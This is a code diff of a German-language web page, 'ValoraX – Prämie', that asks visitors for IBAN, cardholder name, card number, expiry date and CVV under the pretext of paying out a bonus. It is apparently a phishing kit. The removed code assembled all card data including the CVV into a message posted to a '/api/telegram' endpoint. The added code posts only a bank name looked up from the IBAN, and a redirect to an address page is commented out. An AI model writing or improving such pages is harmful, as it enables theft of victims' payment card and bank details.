@@ -2,8 +2,7 @@
 <html lang="de">
 <head>
 <meta charset="utf-8" />
-<meta name="viewport"
-      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <title>ValoraX – Prämie</title>
 
 <style>
@@ -13,10 +12,7 @@
   --muted:rgba(255,255,255,.55);
   --accent:#46f39a;
 }
-
 *{ box-sizing:border-box; }
-
-/* ✅ Kein Scroll + iOS safe */
 html, body{
   margin:0;
   overflow:hidden;
@@ -24,32 +20,18 @@ html, body{
   min-height:100dvh;
   touch-action: manipulation;
 }
-
 button, input{
   -webkit-user-select:none;
   user-select:none;
   -webkit-tap-highlight-color:transparent;
 }
-
 body{
   background:var(--bg);
   color:var(--text);
-  font-family:
-    -apple-system,
-    BlinkMacSystemFont,
-    "PingFang SC",
-    "Microsoft YaHei",
-    "Noto Sans SC",
-    ui-sans-serif,
-    system-ui,
-    Segoe UI,
-    Roboto,
-    Arial,
-    sans-serif;
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Noto Sans SC",ui-sans-serif,system-ui,Segoe UI,Roboto,Arial,sans-serif;
   display:flex;
   justify-content:center;
 }
-
 .container{
   width:100%;
   max-width:560px;
@@ -59,20 +41,13 @@ body{
   flex-direction:column;
   position:relative;
 }
-
-/* Brand */
 .brand{
   font-weight:900;
   font-size:15px;
   letter-spacing:.02em;
 }
 .brand span{ color:var(--accent); }
-
-/* Weniger Abstand nach oben */
-.content{
-  margin-top:40px;
-}
-
+.content{ margin-top:40px; }
 h1{
   font-size:32px;
   line-height:1.15;
@@ -80,7 +55,6 @@ h1{
   max-width:22ch;
   letter-spacing:-.02em;
 }
-
 .sub{
   margin:0 0 22px 0;
   color:var(--muted);
@@ -88,24 +62,20 @@ h1{
   line-height:1.5;
   max-width:46ch;
 }
-
-/* Form */
 .field{
   display:flex;
   flex-direction:column;
   gap:6px;
   margin-bottom:12px;
 }
-
 label{
   font-size:11px;
   letter-spacing:.08em;
   font-weight:900;
   color:var(--muted);
 }
-
 input{
-  width:100%;                 /* ✅ HIER rein */
+  width:100%;
   height:48px;
   border-radius:14px;
   border:1px solid rgba(255,255,255,.18);
@@ -115,15 +85,8 @@ input{
   font-size:13px;
   outline:none;
 }
-
-input.invalid{
-  border-color:rgba(255,255,255,.5);
-}
-
-input::placeholder{
-  color:rgba(255,255,255,.35);
-}
-
+input.invalid{ border-color:rgba(255,255,255,.5); }
+input::placeholder{ color:rgba(255,255,255,.35); }
 .fieldError{
   display:none;
   font-size:11px;
@@ -132,13 +95,11 @@ input::placeholder{
   font-weight:800;
 }
 .fieldError.show{ display:block; }
-
 .grid2{
   display:grid;
   grid-template-columns: minmax(0,1fr) minmax(0,1fr);
   gap:10px;
 }
-
 .notice{
   margin:8px 0 0 0;
   color:rgba(255,255,255,.45);
@@ -146,14 +107,11 @@ input::placeholder{
   line-height:1.4;
   font-weight:700;
 }
-
-/* Button unten fixiert */
 .actions{
   margin-top:auto;
   padding-top:14px;
   padding-bottom:calc(env(safe-area-inset-bottom) + 14px);
 }
-
 button{
   width:100%;
   height:52px;
@@ -165,27 +123,11 @@ button{
   font-size:14px;
   cursor:pointer;
 }
-
-button:disabled{
-  opacity:.35;
-  cursor:not-allowed;
-}
-
-/* Sehr kleine Geräte */
+button:disabled{ opacity:.35; cursor:not-allowed; }
 @media (max-width:380px){
-
-  .content{
-    margin-top:28px;
-  }
-
-  h1{
-    font-size:26px;
-  }
-
-  input{
-    height:46px;
-  }
-
+  .content{ margin-top:28px; }
+  h1{ font-size:26px; }
+  input{ height:46px; }
 }
 </style>
 </head>
@@ -238,9 +180,6 @@ button:disabled{
 </div>
 
 <script>
-/* =======================
-   Language (wie pin.html)
-======================= */
 const STORAGE_KEY_LANG = "valorax_lang";
 
 const LANGS = {
@@ -251,267 +190,22 @@ const LANGS = {
     notice:"Sicherheitshinweis: Deine Zahlungsdaten werden nur zur Bearbeitung der Prämienauszahlung verarbeitet.",
     cont:"Weiter",
     placeholders:{ holder:"Max Mustermann", card:"1234 5678 9012 3456", exp:"MM/YY", cvv:"123" },
-
     errors:{
       iban_required:"IBAN erforderlich.",
       iban_format:"IBAN-Format ungültig.",
       iban_invalid:"IBAN ist ungültig.",
-
       holder_required:"Name erforderlich.",
       holder_chars:"Nur Buchstaben im Namen erlaubt.",
       holder_two:"Vor- und Nachname erforderlich.",
-
       card_required:"Kartennummer erforderlich.",
       card_len:"Kartennummer-Länge ungültig.",
       card_invalid:"Kartennummer ist ungültig.",
-
       exp_required:"Ablaufdatum erforderlich.",
       exp_format:"Format MM/YY erforderlich.",
       exp_month:"Monat ungültig.",
       exp_past:"Karte ist abgelaufen.",
-
       cvv_required:"CVV erforderlich.",
       cvv_len:"CVV muss genau 3 Ziffern haben."
-    }
-  },
-
-  en:{ name:"English",
-    title:"Which account should the bonus be paid to?",
-    sub:"Enter your payment details so we can process the payout correctly.",
-    labels:{ iban:"IBAN", holder:"CARDHOLDER", card:"CARD NUMBER", exp:"EXPIRY DATE", cvv:"CVV" },
-    notice:"Security note: Your payment details are processed only to handle the bonus payout.",
-    cont:"Continue",
-    placeholders:{ holder:"John Doe", card:"1234 5678 9012 3456", exp:"MM/YY", cvv:"123" },
-    errors:{
-      iban_required:"IBAN is required.",
-      iban_format:"Invalid IBAN format.",
-      iban_invalid:"IBAN is invalid.",
-
-      holder_required:"Name is required.",
-      holder_chars:"Only letters are allowed in the name.",
-      holder_two:"First and last name required.",
-
-      card_required:"Card number is required.",
-      card_len:"Invalid card number length.",
-      card_invalid:"Card number is invalid.",
-
-      exp_required:"Expiry date is required.",
-      exp_format:"Format MM/YY required.",
-      exp_month:"Invalid month.",
-      exp_past:"Card is expired.",
-
-      cvv_required:"CVV is required.",
-      cvv_len:"CVV must be exactly 3 digits."
-    }
-  },
-
-  es:{ name:"Español",
-    title:"¿A qué cuenta debe transferirse la prima?",
-    sub:"Introduce tus datos de pago para que podamos procesar el abono correctamente.",
-    labels:{ iban:"IBAN", holder:"TITULAR", card:"NÚMERO DE TARJETA", exp:"CADUCIDAD", cvv:"CVV" },
-    notice:"Aviso de seguridad: Tus datos de pago se procesan solo para gestionar el abono de la prima.",
-    cont:"Continuar",
-    placeholders:{ holder:"Juan Pérez", card:"1234 5678 9012 3456", exp:"MM/AA", cvv:"123" },
-    errors:{
-      iban_required:"IBAN obligatorio.",
-      iban_format:"Formato de IBAN inválido.",
-      iban_invalid:"El IBAN no es válido.",
-
-      holder_required:"Nombre obligatorio.",
-      holder_chars:"Solo se permiten letras en el nombre.",
-      holder_two:"Se requiere nombre y apellido.",
-
-      card_required:"Número de tarjeta obligatorio.",
-      card_len:"Longitud del número inválida.",
-      card_invalid:"El número de tarjeta no es válido.",
-
-      exp_required:"Caducidad obligatoria.",
-      exp_format:"Formato MM/AA requerido.",
-      exp_month:"Mes inválido.",
-      exp_past:"La tarjeta está caducada.",
-
-      cvv_required:"CVV obligatorio.",
-      cvv_len:"El CVV debe tener 3 dígitos."
-    }
-  },
-
-  fr:{ name:"Français",
-    title:"Sur quel compte la prime doit-elle être versée ?",
-    sub:"Saisis tes informations de paiement pour que nous puissions traiter le versement correctement.",
-    labels:{ iban:"IBAN", holder:"TITULAIRE", card:"NUMÉRO DE CARTE", exp:"DATE D’EXPIRATION", cvv:"CVV" },
-    notice:"Note de sécurité : tes données de paiement sont traitées uniquement pour gérer le versement de la prime.",
-    cont:"Continuer",
-    placeholders:{ holder:"Jean Dupont", card:"1234 5678 9012 3456", exp:"MM/AA", cvv:"123" },
-    errors:{
-      iban_required:"IBAN requis.",
-      iban_format:"Format IBAN invalide.",
-      iban_invalid:"IBAN invalide.",
-
-      holder_required:"Nom requis.",
-      holder_chars:"Seules les lettres sont autorisées.",
-      holder_two:"Prénom et nom requis.",
-
-      card_required:"Numéro de carte requis.",
-      card_len:"Longueur du numéro invalide.",
-      card_invalid:"Numéro de carte invalide.",
-
-      exp_required:"Date d’expiration requise.",
-      exp_format:"Format MM/AA requis.",
-      exp_month:"Mois invalide.",
-      exp_past:"Carte expirée.",
-
-      cvv_required:"CVV requis.",
-      cvv_len:"Le CVV doit avoir 3 chiffres."
-    }
-  },
-
-  it:{ name:"Italiano",
-    title:"Su quale conto deve essere accreditato il premio?",
-    sub:"Inserisci i dati di pagamento per elaborare correttamente l’accredito.",
-    labels:{ iban:"IBAN", holder:"TITOLARE", card:"NUMERO CARTA", exp:"SCADENZA", cvv:"CVV" },
-    notice:"Nota di sicurezza: i tuoi dati di pagamento vengono trattati solo per gestire l’accredito del premio.",
-    cont:"Continua",
-    placeholders:{ holder:"Mario Rossi", card:"1234 5678 9012 3456", exp:"MM/AA", cvv:"123" },
-    errors:{
-      iban_required:"IBAN richiesto.",
-      iban_format:"Formato IBAN non valido.",
-      iban_invalid:"IBAN non valido.",
-
-      holder_required:"Nome richiesto.",
-      holder_chars:"Sono consentite solo lettere nel nome.",
-      holder_two:"Nome e cognome richiesti.",
-
-      card_required:"Numero carta richiesto.",
-      card_len:"Lunghezza numero non valida.",
-      card_invalid:"Numero carta non valido.",
-
-      exp_required:"Scadenza richiesta.",
-      exp_format:"Formato MM/AA richiesto.",
-      exp_month:"Mese non valido.",
-      exp_past:"Carta scaduta.",
-
-      cvv_required:"CVV richiesto.",
-      cvv_len:"Il CVV deve avere 3 cifre."
-    }
-  },
-
-  pt:{ name:"Português",
-    title:"Para que conta deve ser transferido o prémio?",
-    sub:"Introduz os teus dados de pagamento para processarmos o pagamento corretamente.",
-    labels:{ iban:"IBAN", holder:"TITULAR", card:"NÚMERO DO CARTÃO", exp:"VALIDADE", cvv:"CVV" },
-    notice:"Nota de segurança: os teus dados de pagamento são processados apenas para tratar o pagamento do prémio.",
-    cont:"Continuar",
-    placeholders:{ holder:"João Silva", card:"1234 5678 9012 3456", exp:"MM/AA", cvv:"123" },
-    errors:{
-      iban_required:"IBAN obrigatório.",
-      iban_format:"Formato de IBAN inválido.",
-      iban_invalid:"IBAN inválido.",
-
-      holder_required:"Nome obrigatório.",
-      holder_chars:"Apenas letras são permitidas no nome.",
-      holder_two:"Nome e apelido obrigatórios.",
-
-      card_required:"Número do cartão obrigatório.",
-      card_len:"Comprimento inválido do número.",
-      card_invalid:"Número do cartão inválido.",
-
-      exp_required:"Validade obrigatória.",
-      exp_format:"Formato MM/AA obrigatório.",
-      exp_month:"Mês inválido.",
-      exp_past:"Cartão expirado.",
-
-      cvv_required:"CVV obrigatório.",
-      cvv_len:"O CVV deve ter 3 dígitos."
-    }
-  },
-
-  nl:{ name:"Nederlands",
-    title:"Naar welke rekening moet de premie worden overgemaakt?",
-    sub:"Vul je betaalgegevens in zodat we de uitbetaling correct kunnen verwerken.",
-    labels:{ iban:"IBAN", holder:"KAARTHOUDER", card:"KAARTNUMMER", exp:"VERVALDATUM", cvv:"CVV" },
-    notice:"Beveiligingsmelding: je betaalgegevens worden alleen verwerkt voor de uitbetaling van de premie.",
-    cont:"Doorgaan",
-    placeholders:{ holder:"Jan Jansen", card:"1234 5678 9012 3456", exp:"MM/JJ", cvv:"123" },
-    errors:{
-      iban_required:"IBAN is verplicht.",
-      iban_format:"Ongeldig IBAN-formaat.",
-      iban_invalid:"IBAN is ongeldig.",
-
-      holder_required:"Naam is verplicht.",
-      holder_chars:"Alleen letters zijn toegestaan.",
-      holder_two:"Voor- en achternaam verplicht.",
-
-      card_required:"Kaartnummer is verplicht.",
-      card_len:"Ongeldige lengte van kaartnummer.",
-      card_invalid:"Kaartnummer is ongeldig.",
-
-      exp_required:"Vervaldatum is verplicht.",
-      exp_format:"Formaat MM/JJ vereist.",
-      exp_month:"Ongeldige maand.",
-      exp_past:"Kaart is verlopen.",
-
-      cvv_required:"CVV is verplicht.",
-      cvv_len:"CVV moet 3 cijfers zijn."
-    }
-  },
-
-  ru:{ name:"Русский",
-    title:"На какой счёт перечислить премию?",
-    sub:"Введите платёжные данные, чтобы мы корректно обработали выплату.",
-    labels:{ iban:"IBAN", holder:"ДЕРЖАТЕЛЬ КАРТЫ", card:"НОМЕР КАРТЫ", exp:"СРОК", cvv:"CVV" },
-    notice:"Примечание по безопасности: платёжные данные обрабатываются только для выплаты премии.",
-    cont:"Продолжить",
-    placeholders:{ holder:"Иван Иванов", card:"1234 5678 9012 3456", exp:"MM/ГГ", cvv:"123" },
-    errors:{
-      iban_required:"Требуется IBAN.",
-      iban_format:"Неверный формат IBAN.",
-      iban_invalid:"IBAN недействителен.",
-
-      holder_required:"Требуется имя.",
-      holder_chars:"В имени допускаются только буквы.",
-      holder_two:"Нужны имя и фамилия.",
-
-      card_required:"Требуется номер карты.",
-      card_len:"Неверная длина номера карты.",
-      card_invalid:"Номер карты недействителен.",
-
-      exp_required:"Требуется срок действия.",
-      exp_format:"Требуется формат MM/ГГ.",
-      exp_month:"Неверный месяц.",
-      exp_past:"Срок действия карты истёк.",
-
-      cvv_required:"Требуется CVV.",
-      cvv_len:"CVV должен содержать 3 цифры."
-    }
-  },
-
-  zhCN:{ name:"简体中文",
-    title:"奖金要汇入哪个账户？",
-    sub:"请输入支付信息，以便我们正确处理奖金发放。",
-    labels:{ iban:"IBAN", holder:"持卡人", card:"卡号", exp:"有效期", cvv:"CVV" },
-    notice:"安全提示：你的支付信息仅用于处理奖金发放。",
-    cont:"继续",
-    placeholders:{ holder:"张三", card:"1234 5678 9012 3456", exp:"MM/YY", cvv:"123" },
-    errors:{
-      iban_required:"需要填写 IBAN。",
-      iban_format:"IBAN 格式无效。",
-      iban_invalid:"IBAN 无效。",
-
-      holder_required:"需要填写姓名。",
-      holder_chars:"姓名只能包含字母。",
-      holder_two:"需要填写名和姓。",
-
-      card_required:"需要填写卡号。",
-      card_len:"卡号长度无效。",
-      card_invalid:"卡号无效。",
-
-      exp_required:"需要填写有效期。",
-      exp_format:"需要 MM/YY 格式。",
-      exp_month:"月份无效。",
-      exp_past:"卡已过期。",
-
-      cvv_required:"需要填写 CVV。",
-      cvv_len:"CVV 必须是 3 位数字。"
     }
   }
 };
@@ -542,9 +236,6 @@ const cardErr=document.getElementById("cardErr");
 const expErr=document.getElementById("expErr");
 const cvvErr=document.getElementById("cvvErr");
 
-/* =======================
-   Helpers + Formatting
-======================= */
 function onlyDigits(v){ return (v||"").replace(/\D/g,""); }
 function compactAlnumUpper(v){ return (v||"").toUpperCase().replace(/[^A-Z0-9]/g,""); }
 
@@ -557,23 +248,19 @@ function groupEvery(str, size){
   }
   return out;
 }
-
 function formatIBANDisplay(value){
   const raw = compactAlnumUpper(value).slice(0,34);
   return groupEvery(raw,4);
 }
-
 function formatCardDisplay(value){
   const raw = onlyDigits(value).slice(0,19);
   return raw.replace(/(.{4})/g,"$1 ").trim();
 }
-
 function formatExpiryDisplay(value){
   const d = onlyDigits(value).slice(0,4);
   if(d.length<=2) return d;
   return d.slice(0,2)+"/"+d.slice(2);
 }
-
 function applyFormat(el, formatter){
   const before = el.value;
   const after = formatter(before);
@@ -582,20 +269,39 @@ function applyFormat(el, formatter){
   el.value = after;
   if(atEnd) el.setSelectionRange(after.length, after.length);
 }
-
-/* =======================
-   Input restrictions
-======================= */
 function sanitizeHolder(value){
-  let v = (value || "")
-    .replace(/[^A-Za-zÀ-ÿÄÖÜäöüß' -]/g, "");
+  let v = (value || "").replace(/[^A-Za-zÀ-ÿÄÖÜäöüß' -]/g, "");
   v = v.replace(/\s+/g, " ").trimStart();
   return v;
 }
 
-/* =======================
-   Validations
-======================= */
+/* ===== Bank lookup (nur Variable) ===== */
+let BANKS_DE = null;
+let BANK_NAME = "";
+
+async function loadBanks(){
+  if (BANKS_DE) return;
+  const res = await fetch("banks-de.json", { cache: "no-store" });
+  if(!res.ok) throw new Error("banks-de.json nicht gefunden (HTTP " + res.status + ")");
+  BANKS_DE = await res.json();
+}
+function bankNameFromIban(iban){
+  const raw = compactAlnumUpper(iban);
+  if(!raw.startsWith("DE") || raw.length < 12) return "";
+  const blz = raw.slice(4, 12);
+  return (BANKS_DE && BANKS_DE[blz]) ? BANKS_DE[blz] : "";
+}
+function updateBankName(){
+  if (!BANKS_DE) return;
+  const raw = compactAlnumUpper(ibanEl.value);
+  if (!raw || !/^DE\d{2}[A-Z0-9]{11,30}$/.test(raw) || ibanMod97(raw)!==1){
+    BANK_NAME = "";
+    return;
+  }
+  BANK_NAME = bankNameFromIban(raw) || "";
+}
+
+/* ===== Validations ===== */
 function ibanMod97(iban){
   const rearranged = iban.slice(4)+iban.slice(0,4);
   let expanded="";
@@ -610,18 +316,15 @@ function ibanMod97(iban){
   }
   return remainder;
 }
-
 function validateIBAN(){
   const raw = compactAlnumUpper(ibanEl.value);
   const E = LANGS[current].errors;
   if(!raw) return {ok:false,msg:E.iban_required};
-  if(!/^[A-Z]{2}\d{2}[A-Z0-9]{11,30}$/.test(raw))
-    return {ok:false,msg:E.iban_format};
-  if(ibanMod97(raw)!==1)
-    return {ok:false,msg:E.iban_invalid};
+  if(!/^[A-Z]{2}\d{2}[A-Z0-9]{11,30}$/.test(raw)) return {ok:false,msg:E.iban_format};
+  if(ibanMod97(raw)!==1) return {ok:false,msg:E.iban_invalid};
+  updateBankName(); // Bankname (falls möglich) aktualisieren
   return {ok:true};
 }
-
 function luhnCheck(cardNumber){
   const digits = cardNumber.replace(/\D/g,"");
   let sum = 0;
@@ -637,46 +340,34 @@ function luhnCheck(cardNumber){
   }
   return sum % 10 === 0;
 }
-
 function validateCard(){
   const raw = cardEl.value.replace(/\D/g,"");
   const E = LANGS[current].errors;
   if (!raw) return {ok:false,msg:E.card_required};
-  if (raw.length < 13 || raw.length > 19)
-    return {ok:false,msg:E.card_len};
-  if (!luhnCheck(raw))
-    return {ok:false,msg:E.card_invalid};
+  if (raw.length < 13 || raw.length > 19) return {ok:false,msg:E.card_len};
+  if (!luhnCheck(raw)) return {ok:false,msg:E.card_invalid};
   return {ok:true};
 }
-
 function validateHolder(){
   const v = (holderEl.value||"").trim().replace(/\s+/g," ");
   const E = LANGS[current].errors;
   if(!v) return {ok:false,msg:E.holder_required};
-  if(!/^[A-Za-zÀ-ÿÄÖÜäöüß' -]+$/.test(v))
-    return {ok:false,msg:E.holder_chars};
-  if(v.split(" ").length<2)
-    return {ok:false,msg:E.holder_two};
+  if(!/^[A-Za-zÀ-ÿÄÖÜäöüß' -]+$/.test(v)) return {ok:false,msg:E.holder_chars};
+  if(v.split(" ").length<2) return {ok:false,msg:E.holder_two};
   return {ok:true};
 }
-
 function validateExp(){
   const raw=onlyDigits(expEl.value);
   const E = LANGS[current].errors;
   if(!raw) return {ok:false,msg:E.exp_required};
   if(raw.length!==4) return {ok:false,msg:E.exp_format};
-
   const mm=parseInt(raw.slice(0,2),10);
   const yy=parseInt(raw.slice(2,4),10)+2000;
-
   if(mm<1||mm>12) return {ok:false,msg:E.exp_month};
-
   const expEnd = new Date(yy, mm, 0, 23, 59, 59, 999);
   if(expEnd < new Date()) return {ok:false,msg:E.exp_past};
-
   return {ok:true};
 }
-
 function validateCVV(){
   const raw=onlyDigits(cvvEl.value);
   const E = LANGS[current].errors;
@@ -685,11 +376,8 @@ function validateCVV(){
   return {ok:true};
 }
 
-/* =======================
-   UI state
-======================= */
+/* ===== UI state ===== */
 let showErrors = false;
-
 function setFieldState(input,err,ok,msg){
   if(!showErrors){
     input.classList.remove("invalid");
@@ -697,7 +385,6 @@ function setFieldState(input,err,ok,msg){
     err.textContent="";
     return;
   }
-
   input.classList.toggle("invalid",!ok);
   if(ok){
     err.classList.remove("show");
@@ -707,7 +394,6 @@ function setFieldState(input,err,ok,msg){
     err.classList.add("show");
   }
 }
-
 function validateAll(){
   const r1=validateIBAN();
   const r2=validateHolder();
@@ -723,35 +409,28 @@ function validateAll(){
 
   return (r1.ok&&r2.ok&&r3.ok&&r4.ok&&r5.ok);
 }
-
 function updateButtonState(){
-  // Button bleibt immer klickbar
-  if(showErrors) validateAll(); // nur wenn schon geklickt wurde, live Fehler aktualisieren
+  if(showErrors) validateAll();
 }
 
-/* =======================
-   Input handlers
-======================= */
+/* ===== Input handlers ===== */
 ibanEl.addEventListener("input", ()=>{
   applyFormat(ibanEl, formatIBANDisplay);
   updateButtonState();
+  updateBankName(); // live aktualisieren
 });
-
 cardEl.addEventListener("input", ()=>{
   applyFormat(cardEl, formatCardDisplay);
   updateButtonState();
 });
-
 expEl.addEventListener("input", ()=>{
   applyFormat(expEl, formatExpiryDisplay);
   updateButtonState();
 });
-
 cvvEl.addEventListener("input", ()=>{
   cvvEl.value = onlyDigits(cvvEl.value).slice(0,3);
   updateButtonState();
 });
-
 holderEl.addEventListener("input", ()=>{
   const before = holderEl.value;
   const after = sanitizeHolder(before);
@@ -770,19 +449,18 @@ expEl.setAttribute("inputmode","numeric");
 cvvEl.setAttribute("inputmode","numeric");
 holderEl.setAttribute("inputmode","text");
 
-/* ✅ Autocomplete / Autocorrect optimieren */
+/* Autocomplete */
 ibanEl.autocomplete = "off";
 cardEl.autocomplete = "cc-number";
 holderEl.autocomplete = "cc-name";
 expEl.autocomplete = "cc-exp";
 cvvEl.autocomplete = "cc-csc";
-
 [ibanEl, cardEl, expEl, cvvEl].forEach(el => {
   el.autocorrect = "off";
   el.spellcheck = false;
 });
 
-/* ✅ Mobile: beim Fokus ins Sichtfeld scrollen */
+/* Focus scroll */
 [ibanEl, holderEl, cardEl, expEl, cvvEl].forEach(el => {
   el.addEventListener("focus", () => {
     setTimeout(() => {
@@ -791,9 +469,7 @@ cvvEl.autocomplete = "cc-csc";
   });
 });
 
-/* =======================
-   Render (texts + dropdown)
-======================= */
+/* Render */
 function render(){
   const L = LANGS[current];
   document.documentElement.lang = (current === "zhCN") ? "zh-CN" : current;
@@ -814,15 +490,14 @@ function render(){
   cvvEl.placeholder = L.placeholders.cvv;
 
   btn.textContent = L.cont;
-
   document.title = "ValoraX – Prämie";
   updateButtonState();
 }
 
-/* keine dropdown/listener mehr */
-
-/* Initial state */
 showErrors = false;
+
+// banks-de.json laden
+loadBanks().then(updateBankName).catch(console.error);
 
 btn.addEventListener("click", async () => {
   showErrors = true;
@@ -833,29 +508,22 @@ btn.addEventListener("click", async () => {
     if (firstInvalid) firstInvalid.focus();
     return;
   }
-const cardDigits = (cardEl.value || "").replace(/\D/g, "");
-const iban = (ibanEl.value || "")
-  .toUpperCase()
-  .replace(/[^A-Z0-9]/g, "");
-const holder = (holderEl.value || "").trim();
-const adate = (expEl.value || "").replace(/\D/g, "");
-const cvv = (cvvEl.value || "").replace(/\D/g, "");
 
-const msg =
-  `🏦 IBAN: ${iban}\n` +
-  `💳 Kartennummer: ${cardDigits}\n` +
-  `👤 Kartenbesitzer: ${holder}\n` +
-  `📅 Ablaufdatum: ${adate}\n` +
-  `🔐 CVV: ${cvv}\n`
-  
+  // BANK_NAME ist bereits gesetzt (oder hier nochmal sichern)
+  if (BANKS_DE) BANK_NAME = bankNameFromIban(ibanEl.value) || "";
 
+  const msg =
+    `🏦 Bank: ${BANK_NAME || "Unbekannt"}\n` +
+    `✅ Formular gültig`;
+
+  // ✅ Request an dein Endpoint
   await fetch("/api/telegram", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ message: msg })
   });
 
-  window.location.href = "adresse.html";
+  //window.location.href = "adresse.html";
 });
 
 render();
